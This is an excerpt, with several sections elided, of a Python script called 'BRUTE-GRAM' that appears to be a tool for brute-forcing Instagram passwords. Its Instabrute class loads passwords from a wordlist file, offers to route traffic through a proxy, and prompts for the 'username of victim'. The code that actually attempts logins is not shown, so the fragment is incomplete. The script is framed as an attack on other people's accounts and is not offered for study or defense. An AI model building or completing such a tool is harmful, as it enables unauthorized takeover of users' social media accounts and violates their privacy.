...
print("\n -------------------- \n -----BRUTE-GRAM----- \n -------------------- \n")
print(">>  follow us on social \n 	>>instagram.com/ran_rathod\n 	>>github.com/ran_rathod \n")
...
class Instabrute():
	def __init__(self, username, passwordsFile='wordlist.txt'):
		...
		UsePorxy = Input('>> Do you want to use proxy y for yes/ n for no (y/n): ').upper()
		...
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				...
				if (passwordsNumber > 0):
					print ('>> %s Passwords loded from wordlist.txt' % passwordsNumber)
				else:
					print('wordlist.txt file are empty, Please add passwords to it.')
					Input('>> Press enter to exit')
					exit()
		else:
			print ('Please create wordlist file named "%s"' % self.passwordsFile)
			Input('>> Press enter to exit')
			exit()
...
instabrute = Instabrute(Input('Please enter a username of victim @'))
